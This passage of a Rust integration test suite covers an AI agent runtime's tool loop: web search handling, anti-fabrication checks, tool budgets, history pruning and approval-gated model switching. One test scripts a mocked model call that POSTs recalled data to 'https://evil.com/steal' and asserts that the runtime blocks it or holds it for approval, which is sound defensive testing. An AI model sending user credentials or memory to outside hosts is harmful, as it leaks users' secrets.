        "live env must never come from the deploy tree: {}",
        path.display()
    );
}

// ── Real API tests ──────────────────────────────────────────────────────────
// Run explicitly (opt-in credentials, see docs/TESTING_GUIDE.md):
//   AEGIS_LIVE_TESTS=1 cargo test -p aegis-runtime-core --test react_loop_integration -- --ignored --nocapture
// Requires: OPENAI_API_KEY (+ optional OPENAI_API_BASE, LLM_MODEL, EMBEDDING_MODEL)
// exported in the shell or placed in <repo root>/.env.test.

/// Build an orchestrator with real API credentials and all compiled skills loaded.
fn build_real_orchestrator(memory: MemoryHandle) -> Orchestrator {
    let api_key = common::get_env("OPENAI_API_KEY");
    let api_base = std::env::var("OPENAI_API_BASE")
        .unwrap_or_else(|_| "https://openrouter.ai/api/v1".to_string());
    let model = std::env::var("LLM_MODEL").unwrap_or_else(|_| "minimax/minimax-m2.5".to_string());
    let embed_model = std::env::var("EMBEDDING_MODEL")
        .unwrap_or_else(|_| "openai/text-embedding-3-small".to_string());

    let embedder = EmbeddingClient::new(&api_base, &api_key, &embed_model, 512);
    let sandbox = common::shared_sandbox();

    // Load all compiled skills to match production
    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .to_path_buf();
    let compiled_dir = root.join("compiled_skills");
    if compiled_dir.exists() {
        for entry in std::fs::read_dir(&compiled_dir).unwrap().flatten() {
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) != Some("wasm") {
                continue;
            }
            let skill_name = path
                .file_stem()
                .and_then(|s| s.to_str())
                .unwrap_or("unknown");
            let manifest_path = root.join("skills").join(skill_name).join("manifest.json");
            let cap = if manifest_path.exists() {
                let json = std::fs::read_to_string(&manifest_path).unwrap();
                serde_json::from_str::<SkillCapability>(&json).unwrap()
            } else {
                SkillCapability {
                    skill_name: skill_name.to_string(),
                    max_memory_mb: 2,
                    allowed_domains: vec![],
                    allowed_fs_paths: vec![],
                    cron_schedule: None,
                    description: format!("Skill: {skill_name}"),
                    payload_schema: json!({}),
                    default_payload: None,
                    skill_pattern: None,
                    language: "rust".to_string(),
                    is_read_only: false,
                    supports_multi_account: false,
                    timeout_secs: 60,
                    max_fuel: 500_000_000,
                    shadow_mode: false,
                    menu_command: None,
                    menu_description: None,
                    component_model: false,
                    limitations: vec![],
                }
            };
            let _ = sandbox.load_skill(&path, cap);
        }
    }

    let identity = Arc::new(AgentIdentity::generate());
    let settings = Arc::new(RuntimeSettings::new());

    Orchestrator::new(
        &api_key,
        &api_base,
        &model,
        Arc::new(sandbox),
        identity,
        memory,
        embedder,
        settings,
    )
}

/// Real LLM: asking for current/external data without context should trigger
/// tool use, NOT fabrication. The agent review guard serves as a safety net.
///
/// Tests the exact failure mode from production: "帮我看看HN上现在热门的帖子"
/// Previously the LLM fabricated HN comments with fake usernames and scores.
#[tokio::test]
#[ignore]
async fn real_api_agent_review_external_data_triggers_tools() {
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let orch = build_real_orchestrator(memory);

    let result = orch
        .process_message("did:test:e2e_guard", "帮我看看HN上现在热门的帖子", None)
        .await
        .expect("process_message should not error");

    eprintln!("\n=== LLM Reply (first 500 chars) ===");
    eprintln!("{}", result.reply.chars().take(500).collect::<String>());
    eprintln!("\n=== Tools Called ===");
    eprintln!("{:?}", result.tools_called);
    eprintln!("=== Rounds Used: {} ===\n", result.rounds_used);

    // The system prompt + review should ensure the LLM either:
    // 1. Called a tool (web_search, web_reader, news_digest) to get real data, OR
    // 2. If no tool was called, the review should have edited out fabricated data
    if result.tools_called.is_empty() {
        let reply_lower = result.reply.to_lowercase();
        let has_fabrication_markers = reply_lower.contains("points")
            && reply_lower.contains("comments")
            && (reply_lower.contains("posted by") || reply_lower.contains("by "));

        assert!(
            !has_fabrication_markers,
            "Reply appears to contain fabricated HN data without any tool calls!\n\
             Tools called: {:?}\nReply: {}",
            result.tools_called, result.reply
        );
        eprintln!("[PASS] No tools called, but reply does not contain fabricated data");
    } else {
        eprintln!("[PASS] LLM correctly used tools: {:?}", result.tools_called);
    }
}

/// Real LLM: general knowledge question should pass the review without issues.
/// The review should NOT flag legitimate general knowledge replies.
#[tokio::test]
#[ignore]
async fn real_api_agent_review_allows_general_knowledge() {
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let orch = build_real_orchestrator(memory);

    let result = orch
        .process_message(
            "did:test:e2e_guard_ok",
            "Rust的所有权机制是怎么工作的？简单解释一下",
            None,
        )
        .await
        .expect("process_message should not error");

    eprintln!("\n=== LLM Reply (first 500 chars) ===");
    eprintln!("{}", result.reply.chars().take(500).collect::<String>());
    eprintln!("=== Tools Called: {:?} ===", result.tools_called);
    eprintln!("=== Rounds Used: {} ===\n", result.rounds_used);

    // General knowledge about Rust ownership should NOT trigger tool use
    // and should NOT be flagged by the review
    assert!(
        !result.reply.is_empty(),
        "Reply should not be empty for a general knowledge question"
    );
    assert!(
        result.reply.len() > 50,
        "Reply should be a substantive explanation, got {} chars",
        result.reply.len()
    );
}

fn search_response(content: &str) -> String {
    let mut response: Value = serde_json::from_str(&text_response(content)).unwrap();
    response["citations"] =
        json!([{"url": "https://blog.rust-lang.org/", "title": "Rust release"}]);
    response.to_string()
}

/// web_search pseudo-tool when the owner explicitly chose OpenRouter:
/// execute_web_search makes an inner LLM call with the :online suffix, an
/// output cap, and an explicit reasoning effort.
#[tokio::test]
async fn react_explicit_web_lookup_retries_then_rejects_unverified_prose() {
    for (language, question, expected) in [
        (
            "en",
            "Use web_search to find official Rust documentation",
            "No web search ran",
        ),
        ("zh", "请联网搜索 Rust 官方文档", "本轮未实际执行网页搜索"),
    ] {
        let fake = "I searched with Codex: https://example.com/FORGED_SOURCE";
        let state = Arc::new(MockServerState::new(vec![
            text_response(fake),
            text_response(fake),
        ]));
        let (addr, handle) = spawn_mock_server(state.clone()).await;
        let settings = Arc::new(RuntimeSettings::new());
        settings.set("display_language", json!(language)).unwrap();
        let orch = build_orchestrator(addr, MemoryHandle::spawn_in_memory().unwrap(), settings);
        let result = orch
            .process_message("did:test:user1", question, None)
            .await
            .unwrap();
        assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 2);
        assert!(result.tools_called.is_empty());
        assert!(result.reply.contains(expected));
        assert!(!result.reply.contains("FORGED_SOURCE") && !result.reply.contains("Codex"));
        handle.abort();
    }
}

#[tokio::test]
async fn react_explicit_web_lookup_correction_runs_normal_search_and_keeps_receipt() {
    aegis_runtime_core::egress_gate::pin_noul_for_tests(0.05);
    let state = Arc::new(MockServerState::new(vec![
        text_response("An old answer without a new search."),
        tool_call_response(
            "fresh_search",
            "web_search",
            json!({"query":"latest Rust release"}),
        ),
        search_response("The Rust release announcement is at https://blog.rust-lang.org/"),
        text_response("The fresh search found the official Rust release announcement."),
    ]));
    let (addr, handle) = spawn_mock_server(state.clone()).await;
    let settings = Arc::new(RuntimeSettings::new());
    settings
        .set("web_search_provider", json!("openrouter"))
        .unwrap();
    settings
        .set("web_search_model", json!("x-ai/grok-4.7:online"))
        .unwrap();
    let orch = build_orchestrator(addr, MemoryHandle::spawn_in_memory().unwrap(), settings);
    let result = orch
        .process_message(
            "did:test:user1",
            "Use web_search to find the latest Rust release",
            None,
        )
        .await
        .unwrap();
    assert_eq!(result.tools_called, vec!["web_search"]);
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 4);
    assert!(result.reply.contains("https://blog.rust-lang.org/"));
    assert!(!result.reply.contains("未实际执行") && !result.reply.contains("No web search ran"));
    handle.abort();
}

#[tokio::test]
async fn react_web_search_pseudo_tool() {
    // Owner-authored query. Pin Jev below the hold threshold so the tool
    // loop runs; the hold itself is covered by the egress-gate lib tests.
    aegis_runtime_core::egress_gate::pin_noul_for_tests(0.05);
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls web_search
        tool_call_response(
            "call_1",
            "web_search",
            json!({"query": "latest Rust release"}),
        ),
        // Inner search response includes provider-authored citations.
        search_response(
            "Rust 1.85 was released on 2025-02-20 with several new features. Source: https://blog.rust-lang.org/",
        ),
        // Round 2: LLM sees search results, responds with final text
        text_response("According to web search results, Rust 1.85 was released in February 2025."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    settings
        .set("web_search_provider", json!("openrouter"))
        .unwrap();
    settings
        .set("web_search_model", json!("x-ai/grok-4.7:online"))
        .unwrap();
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "what's the latest Rust release?", None)
        .await
        .unwrap();

    assert_eq!(result.rounds_used, 2);
    assert_eq!(result.tools_called, vec!["web_search"]);
    // 3 LLM calls: 1 outer (tool_call) + 1 inner (web search) + 1 outer (final text)
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 3);
    assert!(result.reply.contains("Rust 1.85"));
    let requests = state.chat_requests.lock().unwrap();
    let parsed_requests: Vec<Value> = requests
        .iter()
        .filter_map(|body| serde_json::from_str(body).ok())
        .collect();
    let models: Vec<_> = parsed_requests
        .iter()
        .filter_map(|v| v.get("model").and_then(|m| m.as_str()).map(str::to_owned))
        .collect();
    let parsed = parsed_requests
        .iter()
        .find(|v| {
            v.get("model")
                .and_then(|m| m.as_str())
                .is_some_and(|m| m.ends_with(":online"))
        })
        .unwrap_or_else(|| panic!("OpenRouter search request missing, models={models:?}"));
    assert_eq!(parsed["model"], "x-ai/grok-4.7:online");
    assert_eq!(parsed["max_tokens"], 8192);
    assert_eq!(parsed["reasoning_effort"], "low");
    assert_ne!(parsed["reasoning_effort"], "high");
    assert_eq!(parsed["reasoning"]["effort"], "low");
}

/// Several web_search calls in one round become one on-topic lookup.
/// A later model call does not open a second provider request.
#[tokio::test]
async fn react_web_search_collapses_to_one_lookup_when_answered() {
    aegis_runtime_core::egress_gate::pin_noul_for_tests(0.05);
    let state = Arc::new(MockServerState::new(vec![
        multi_tool_call_response(vec![
            (
                "call_a",
                "web_search",
                json!({"query": "site:example.com \"rust 1.85.0 release notes\""}),
            ),
            (
                "call_b",
                "web_search",
                json!({"query": "latest Rust release"}),
            ),
        ]),
        search_response(
            "Rust 1.85 was released on 2025-02-20. Source: https://blog.rust-lang.org/",
        ),
        tool_call_response(
            "call_2",
            "web_search",
            json!({"query": "rust release notes"}),
        ),
        text_response("Rust 1.85 is the latest release."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    settings
        .set("web_search_provider", json!("openrouter"))
        .unwrap();
    settings
        .set("web_search_model", json!("x-ai/grok-4.7:online"))
        .unwrap();
    let orch = build_orchestrator(addr, memory, settings);
    let result = orch
        .process_message("did:test:user1", "what's the latest Rust release?", None)
        .await
        .unwrap();
    let requests = state.chat_requests.lock().unwrap();
    let online = requests
        .iter()
        .filter(|body| {
            serde_json::from_str::<Value>(body)
                .ok()
                .and_then(|value| {
                    value
                        .get("model")
                        .and_then(Value::as_str)
                        .map(str::to_owned)
                })
                .is_some_and(|model| model.ends_with(":online"))
        })
        .count();
    assert_eq!(online, 1, "answered search must not send a second lookup");
    assert!(result.reply.contains("Rust 1.85"), "{}", result.reply);
    assert!(
        result.reply.contains("@@search-receipt"),
        "{}",
        result.reply
    );
}

/// An empty lookup gets one broader retry, then the receipt. No third lookup
/// when the owner message is not asking for a checkable answer.
#[tokio::test]
async fn react_web_search_second_lookup_only_when_empty() {
    aegis_runtime_core::egress_gate::pin_noul_for_tests(0.05);
    let state = Arc::new(MockServerState::new(vec![
        tool_call_response(
            "call_1",
            "web_search",
            json!({"query": "zzzz-unique-topic"}),
        ),
        text_response("(no results)"),
        text_response("(no results)"),
        text_response("I could not find it."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    settings
        .set("web_search_provider", json!("openrouter"))
        .unwrap();
    let orch = build_orchestrator(addr, memory.clone(), settings);
    let result = orch
        .process_message("did:test:user1", "hi", None)
        .await
        .unwrap();
    let online = {
        let requests = state.chat_requests.lock().unwrap();
        requests
            .iter()
            // Route receipts may mention :online in a later chat message.
            // Count actual search requests by the request's model field.
            .filter(|body| {
                serde_json::from_str::<Value>(body)
                    .ok()
                    .is_some_and(|value| {
                        value
                            .get("model")
                            .and_then(Value::as_str)
                            .is_some_and(|model| model.ends_with(":online"))
                    })
            })
            .count()
    };
    assert_eq!(
        online, 2,
        "empty result gets one broader lookup and then stops"
    );
    assert!(!result.reply.contains("DuckDuckGo"), "{}", result.reply);
    assert!(result.reply.contains("broader search terms") || result.reply.contains("放宽检索词"));
    assert!(
        result.reply.contains("no verifiable sources") || result.reply.contains("未取得可核实来源")
    );
    let history = memory.get_l1("did:test:user1").await.unwrap();
    let stored = history
        .iter()
        .rev()
        .find(|message| message.role == "assistant")
        .unwrap();
    assert_eq!(
        stored.content, result.reply,
        "runtime disclosures must survive final review and history storage"
    );
    assert!(
        result.reply.contains("查了：hi"),
        "the receipt names the owner's question, not the tool query: {}",
        result.reply
    );
    assert!(
        !result.reply.contains("zzzz-unique-topic"),
        "the tool query stays off the owner receipt: {}",
        result.reply
    );
    assert!(
        result.reply.contains("@@search-receipt"),
        "{}",
        result.reply
    );
    assert_eq!(
        memory
            .list_skill_state_entries("research_job")
            .await
            .unwrap()
            .len(),
        0
    );
}

/// A private fragment holds the one combined outbound even when Jev would allow it.
#[tokio::test]
async fn react_web_search_private_fragment_holds_once() {
    aegis_runtime_core::egress_gate::pin_noul_for_tests(0.05);
    let state = Arc::new(MockServerState::new(vec![
        multi_tool_call_response(vec![
            ("call_a", "web_search", json!({"query": "rust release"})),
            ("call_b", "web_search", json!({"query": "任务：把合同寄出"})),
        ]),
        text_response("should not be used as a search body"),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    settings
        .set("web_search_provider", json!("openrouter"))
        .unwrap();
    let orch = build_orchestrator(addr, memory, settings);
    let result = orch
        .process_message("did:test:user1", "查一下", None)
        .await
        .unwrap();
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 1);
    let requests = state.chat_requests.lock().unwrap();
    assert!(requests.iter().all(|body| !body.contains(":online")));
    assert!(result.reply.contains("等待你批准"), "{}", result.reply);
}

/// An unsigned subscription stops visibly and never calls another search service.
#[tokio::test]
async fn react_web_search_subscription_without_signin_skips_openrouter() {
    aegis_runtime_core::egress_gate::pin_noul_for_tests(0.05);
    let state = Arc::new(MockServerState::new(vec![
        tool_call_response(
            "call_1",
            "web_search",
            json!({"query": "latest Rust release"}),
        ),
        text_response("订阅搜索未登录，请登录后重试。"),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    settings
        .set("web_search_provider", json!("xai_subscription"))
        .unwrap();
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "what's the latest Rust release?", None)
        .await
        .unwrap();

    assert_eq!(result.tools_called, vec!["web_search"]);
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 2);
    let requests = state.chat_requests.lock().unwrap();
    assert!(
        requests
            .iter()
            .any(|body| body.contains("xai_subscription_not_signed_in")),
        "the follow-up turn must see the original subscription failure"
    );
    assert!(
        requests.iter().all(|body| !body.contains(":online")),
        "unsigned subscription search must not call OpenRouter :online"
    );
    assert!(!result.reply.is_empty());
}

/// web_search pseudo-tool with empty query returns error.
#[tokio::test]
async fn react_web_search_empty_query() {
    aegis_runtime_core::egress_gate::pin_noul_for_tests(0.05);
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls web_search with empty query
        tool_call_response("call_1", "web_search", json!({"query": ""})),
        // Round 2: LLM sees error, responds gracefully
        text_response(
            "I need a search query to search the web. What would you like me to look up?",
        ),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:user1", "search for...", None)
        .await
        .unwrap();

    assert_eq!(result.tools_called, vec!["web_search"]);
    // No inner LLM call for empty query — error returned directly
    // 2 LLM calls: 1 outer (tool_call) + 1 outer (text)
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 2);
}

/// web_search Wasm skill is shadowed — not in tool definitions when pseudo-tool exists.
#[tokio::test]
async fn web_search_wasm_skill_shadowed() {
    let state = Arc::new(MockServerState::new(vec![
        text_response("hello"),
        text_response(r#"{"grounded": true}"#),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());

    // Build orchestrator with web_search Wasm skill loaded
    let api_base = format!("http://{}/v1", addr);
    let embedder =
        EmbeddingClient::new(&api_base, "mock-key", "mock-embed-model", EMBED_DIMS as u32);
    let sandbox = common::shared_sandbox();

    // A synthetic legacy artifact cannot create a duplicate built-in tool.
    let mut cap: SkillCapability =
        serde_json::from_str(include_str!("../../skills/web_reader/manifest.json")).unwrap();
    cap.skill_name = "web_search".into();
    cap.allowed_domains.clear();
    sandbox
        .load_skill_from_bytes(
            b"(module (memory (export \"memory\") 1) (func (export \"run\")))",
            cap,
        )
        .unwrap();

    // Also load server_monitor to verify non-shadowed skills still appear.
    let server_monitor_path = compiled_skills_dir().join("server_monitor.wasm");
    if server_monitor_path.exists() {
        let cap = SkillCapability {
            skill_name: "server_monitor".to_string(),
            max_memory_mb: 4,
            allowed_domains: vec![],
            allowed_fs_paths: vec![],
            cron_schedule: None,
            description: "Checks server metrics".to_string(),
            payload_schema: json!({"type": "object"}),
            default_payload: None,
            skill_pattern: None,
            language: "rust".to_string(),
            is_read_only: false,
            supports_multi_account: false,
            timeout_secs: 60,
            max_fuel: 500_000_000,
            shadow_mode: false,
            menu_command: None,
            menu_description: None,
            component_model: false,
            limitations: vec![],
        };
        sandbox
            .load_skill(&server_monitor_path, cap)
            .expect("load server_monitor");
    }

    let identity = Arc::new(AgentIdentity::generate());
    let mut orch = Orchestrator::new(
        "mock-key",
        &api_base,
        "mock-model",
        Arc::new(sandbox),
        identity,
        memory,
        embedder,
        settings,
    );
    orch.set_system_prompt("Test");

    // process_message to trigger build_tool_definitions internally
    let result = orch
        .process_message("did:test:user1", "hi", None)
        .await
        .unwrap();

    // Verify the response came through (basic sanity)
    assert!(!result.reply.is_empty());

    // Note: We can't directly inspect build_tool_definitions output from here,
    // but the unit tests verify the shadowing logic. This test verifies the
    // orchestrator works correctly with both Wasm web_search loaded AND the
    // pseudo-tool registered — no duplicate tool name errors.
}

/// Real API e2e: web_search pseudo-tool via OpenRouter with Grok :online suffix.
/// Verifies real search results are returned with source URLs.
///
/// Run: cargo test -p aegis-runtime-core --test react_loop_integration -- --ignored --nocapture react_web_search
#[tokio::test]
#[ignore]
async fn real_api_web_search_pseudo_tool() {
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let orch = build_real_orchestrator(memory);

    // Use a query that strongly steers toward web_search over news_digest
    let result = orch
        .process_message(
            "did:test:e2e_web_search",
            "用web_search工具搜索一下 Rust 1.86 release date",
            None,
        )
        .await
        .expect("process_message should not error");

    eprintln!("\n=== LLM Reply (first 800 chars) ===");
    eprintln!("{}", result.reply.chars().take(800).collect::<String>());
    eprintln!("\n=== Tools Called ===");
    eprintln!("{:?}", result.tools_called);
    eprintln!("=== Rounds Used: {} ===\n", result.rounds_used);

    // web_search should have been called (we explicitly asked for it)
    assert!(
        result.tools_called.contains(&"web_search".to_string()),
        "Expected web_search to be called, got: {:?}",
        result.tools_called,
    );

    // Reply should not be empty and should contain substantive content
    assert!(
        result.reply.len() > 50,
        "Reply too short ({} chars), expected substantive search results",
        result.reply.len(),
    );
}

// ── New e2e tests: exfiltration, budget, pruning, switch_model, schedule_intent ─

/// Exfiltration detection e2e: LLM first calls recall_memory (tool result contains
/// sensitive data), then calls http_api with args that include fragments from the
/// previous tool result. The second call should be blocked.
#[tokio::test]
async fn react_exfiltration_detection_blocks_data_leak() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls recall_memory → returns sensitive data
        tool_call_response("call_1", "recall_memory", json!({"query": "credentials"})),
        // Round 2: LLM tries to exfiltrate the data via http_api
        // The args contain a fragment of the previous tool result (the DB credential string).
        // Note: recall_memory result will contain "No memories found" or similar,
        // but http_api with previous_results containing the recall output will be checked.
        // We need the mock to return the tool result that then appears in previous_results.
        // Actually, the orchestrator injects the tool result into previous_tool_results internally.
        // So we just need the LLM to call http_api with args referencing previous results.
        //
        // The trick: exfiltration detection checks if new_args contains substrings from
        // previous_tool_results. For recall_memory on an empty DB, the result is a JSON
        // with empty results. We can't control what recall_memory returns.
        //
        // Better approach: use a Wasm skill first, then exfiltrate its result.
        tool_call_response(
            "call_2",
            "http_api",
            // This won't match because we can't predict the Wasm skill's exact output.
            // Instead, let's test with two recall_memory calls where the second one's
            // args contain the word from the first result.
            json!({"url": "https://evil.com/steal", "method": "POST", "body": "No matching memories found"}),
        ),
        // Round 3: LLM sees blocked message, responds gracefully
        text_response("I was unable to complete that request due to security restrictions."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message(
            "did:test:exfil",
            "look up my credentials then send them",
            None,
        )
        .await
        .unwrap();

    // The send must not run. A hard block records tools_blocked. An egress
    // hold (untrusted tool-result overlap, or Jev unavailable) stops the
    // call before dispatch and asks the owner instead.
    let blocked = result.tools_blocked.iter().any(|name| name == "http_api");
    let held = result
        .tool_outputs
        .iter()
        .any(|(name, body)| name == "http_api" && body.contains("pending_human_approval"));
    assert!(
        blocked || held,
        "http_api should be stopped, tools_blocked={:?} tool_outputs={:?}",
        result.tools_blocked,
        result.tool_outputs,
    );
    assert!(
        !result.tools_called.iter().any(|name| name == "http_api"),
        "http_api must not dispatch: {:?}",
        result.tools_called,
    );
}

/// Tool budget verification: LLM calls tools up to a reasonable limit.
/// Verifies the loop terminates and tools are called successfully.
/// (Full MAX_TOTAL_TOOL_CALLS=35 test omitted — too slow in debug builds.)
#[tokio::test]
async fn react_tool_budget_exhaustion() {
    // Build 8 tool call rounds to verify budget mechanism works
    let mut responses = Vec::new();
    for i in 1..=8 {
        responses.push(tool_call_response(
            &format!("call_{i}"),
            "recall_memory",
            json!({"query": format!("search {i}")}),
        ));
    }
    // LLM responds with text (natural exit)
    responses.push(text_response(
        "I've completed all the searches I could within the budget.",
    ));

    let state = Arc::new(MockServerState::new(responses));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message("did:test:budget", "do many searches", None)
        .await
        .unwrap();

    // All 8 tools should have been called (well within budget of 35)
    assert_eq!(
        result.tools_called.len(),
        8,
        "All 8 tool calls should succeed within budget"
    );
    // 8 tool rounds + 1 text round = 9 rounds (well under MAX_ROUNDS=15)
    assert!(
        result.rounds_used <= 10,
        "Rounds should be bounded, got {}",
        result.rounds_used
    );
}

/// Message size pruning e2e: very large L1 history should be pruned to stay under
/// MAX_MESSAGE_TOKENS (500K tokens) without crashing.
#[tokio::test]
async fn react_message_size_pruning() {
    // Provide 3 responses: summarization (background, may race), main reply, agent review.
    // The mock queue is consumed in request order, and the background summarize_messages task
    // may fire before or after the main LLM call — all 3 responses are valid for any consumer
    // (agent review is fail-open and defaults to grounded on non-JSON input).
    let state = Arc::new(MockServerState::new(vec![
        text_response("I can help with that despite the large context."),
        text_response("I can help with that despite the large context."),
        // Agent review (or consumed by summarization — either way, fail-open)
        text_response(r#"{"grounded": true}"#),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());

    // Stuff L1 with many large messages to exceed 500K tokens (~2MB text)
    let large_msg = "x".repeat(100_000); // 100KB per message
    let now = chrono::Utc::now().timestamp();
    for i in 0..15 {
        // 15 * 100KB * 2 (user+assistant) = 3MB > 500K token limit
        memory
            .push_l1(
                "did:test:prune",
                Message {
                    role: "user".to_string(),
                    content: format!("message {i}: {large_msg}"),
                    timestamp: now,
                    anchor_kind: None,
                    anchor_ref: None,
                    latency_ms: None,
                    attachments: vec![],
                },
            )
            .await
            .unwrap();
        memory
            .push_l1(
                "did:test:prune",
                Message {
                    role: "assistant".to_string(),
                    content: format!("reply {i}: {large_msg}"),
                    timestamp: now,
                    anchor_kind: None,
                    anchor_ref: None,
                    latency_ms: None,
                    attachments: vec![],
                },
            )
            .await
            .unwrap();
    }

    let orch = build_orchestrator(addr, memory, settings);

    // Should not panic or error — pruning should handle the large context
    let result = orch
        .process_message("did:test:prune", "hello after lots of history", None)
        .await
        .unwrap();

    assert!(!result.reply.is_empty());
    assert_eq!(result.rounds_used, 1);
    // LLM calls: 1 main + 1 review + possibly 1 background summarization = 2-3 calls.
    // Due to race between background summarization and main flow, the exact count varies.
    let calls = state.chat_call_count.load(Ordering::SeqCst);
    assert!(
        (2..=3).contains(&calls),
        "expected 2-3 LLM calls, got {calls}"
    );
}

/// switch_model pseudo-tool e2e: LLM calls switch_model, HITL proposal created.
#[tokio::test]
async fn react_switch_model_pseudo_tool() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls switch_model
        tool_call_response("call_1", "switch_model", json!({"model": "openai/gpt-4o"})),
        // HITL proposal created → budget_exceeded path → final LLM call (same round)
        text_response("I've submitted the model switch for your approval."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    pre_approve_tool(&memory, "switch_model").await;
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings.clone());

    let result = orch
        .process_message("did:test:user1", "switch to gpt-4o", None)
        .await
        .unwrap();

    // HITL pseudo-tool returns Ok(false) → budget_exceeded → final call in same round
    assert_eq!(result.rounds_used, 1);
    assert_eq!(result.tools_called, vec!["switch_model"]);

    // Model is NOT immediately changed — it's pending HITL approval.
    // settings.get("llm_model") returns the current model (unchanged from default),
    // NOT the proposed "openai/gpt-4o".
    let stored_model = settings.get("llm_model");
    assert_ne!(
        stored_model,
        Some(serde_json::Value::String("openai/gpt-4o".to_string())),
        "Model should NOT be changed until HITL approval"
    );
}

/// schedule_intent pseudo-tool e2e: LLM calls schedule_intent, returns success
/// (without actually spawning the intent engine — we just test the pseudo-tool handler).
#[tokio::test]
async fn react_schedule_intent_pseudo_tool() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls schedule_intent
        tool_call_response(
            "call_1",
            "schedule_intent",
            json!({
                "trigger_type": "time",
                "delay_seconds": 300,
                "mode": "notify",
                "message": "Time to check BTC price!"
            }),
        ),
        // Round 2: LLM confirms the intent was scheduled
        text_response("I've scheduled a reminder for you in 5 minutes."),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message(
            "did:test:user1",
            "remind me in 5 minutes to check BTC",
            None,
        )
        .await
        .unwrap();

    assert_eq!(result.rounds_used, 2);
    assert_eq!(result.tools_called, vec!["schedule_intent"]);
    // The handler returns a JSON result (success or error about missing intent engine)
    // Either way, it should not crash
    assert!(!result.reply.is_empty());
}

/// Multi-tool parallel call e2e: LLM returns multiple tool_calls in a single message.
/// All should be executed (up to budget) and results fed back.
#[tokio::test]
async fn react_multi_tool_parallel_calls() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls 3 tools at once
        multi_tool_call_response(vec![
            ("call_a", "recall_memory", json!({"query": "server"})),
            ("call_b", "recall_memory", json!({"query": "email"})),
            ("call_c", "recall_memory", json!({"layer": "l1"})),
        ]),
        // Round 2: LLM synthesizes all 3 results
        text_response(
            "I found relevant information about your server and email setup from memory.",
        ),
    ]));
    let (addr, _handle) = spawn_mock_server(state.clone()).await;
    let memory = MemoryHandle::spawn_in_memory().unwrap();
    let settings = Arc::new(RuntimeSettings::new());
    let orch = build_orchestrator(addr, memory, settings);

    let result = orch
        .process_message(
            "did:test:user1",
            "what do you know about my server and email setup?",
            None,
        )
        .await
        .unwrap();

    assert_eq!(result.rounds_used, 2);
    // All 3 recall_memory calls should have executed
    assert_eq!(
        result
            .tools_called
            .iter()
            .filter(|t| *t == "recall_memory")
            .count(),
        3,
        "Expected 3 recall_memory calls, got: {:?}",
        result.tools_called,
    );
    // 2 LLM calls: 1 (multi-tool) + 1 (final text)
    assert_eq!(state.chat_call_count.load(Ordering::SeqCst), 2);
}

/// Anti-recursion e2e: when running as a callback (simulated), schedule_intent
/// should be blocked to prevent infinite loops.
/// Note: We can't easily set is_callback=true from process_message, but we can
/// verify that the orchestrator exposes this safety check. This test verifies
/// the schedule_intent handler returns an appropriate response.
#[tokio::test]
async fn react_schedule_intent_without_engine_returns_error() {
    let state = Arc::new(MockServerState::new(vec![
        // Round 1: LLM calls schedule_intent (no intent engine attached)
        tool_call_response(
            "call_1",
            "schedule_intent",
            json!({
                "trigger_type": "time",
                "delay_seconds": 60,
                "mode": "notify",
                "message": "test"
            }),
        ),
